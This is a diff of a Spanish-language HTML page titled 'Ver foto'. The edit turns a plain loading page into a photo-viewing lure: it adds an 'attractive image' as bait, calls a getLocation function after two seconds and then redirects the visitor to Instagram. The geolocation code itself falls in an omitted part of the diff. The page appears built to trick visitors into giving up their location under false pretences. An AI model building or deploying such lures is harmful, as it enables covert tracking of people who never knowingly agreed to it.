@@ -1,15 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Contenido</title>
+    <title>Ver foto</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: #222; color: #ddd; text-align: center; font-family: sans-serif; padding-top: 40%; }
-        p { font-size: 1.2em; }
+        body { 
+            background-color: #000; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .loader {
+            color: white;
+            font-size: 18px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
-    <p>Cargando contenido, por favor espera...</p>
+    <div class="container">
+        <!-- Imagen atractiva -->
+        <img src="https://i.imgur.com/fJkXnFf.jpg" alt="Foto">
+        <p class="loader">Cargando contenido adicional...</p>
+    </div>
 
     <script>
         function getLocation() {
@@ -49,10 +73,11 @@
         }
 
         function redirigir() {
-            window.location.href = "https://en.wikipedia.org/wiki/Main_Page";
+            window.location.href = "https://www.instagram.com/";
         }
 
-        window.onload = getLocation;
+        // Iniciar después de 2 segundos
+        setTimeout(getLocation, 2000);
     </script>
 </body>
 </html>
